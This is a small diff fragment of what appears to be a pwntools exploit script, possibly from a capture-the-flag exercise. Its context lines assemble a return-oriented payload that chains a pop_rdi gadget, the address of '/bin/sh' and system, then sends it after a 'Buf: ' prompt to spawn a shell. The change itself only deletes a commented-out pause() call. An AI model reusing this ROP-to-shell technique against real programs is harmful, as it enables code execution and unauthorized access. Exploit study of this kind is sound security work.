@@ -146,8 +146,6 @@ payload += p64(pop_rdi)
 payload += p64(binsh)
 payload += p64(system)
 
-# pause()
-
 p.recvuntil('Buf: ')
 p.send(payload)
 
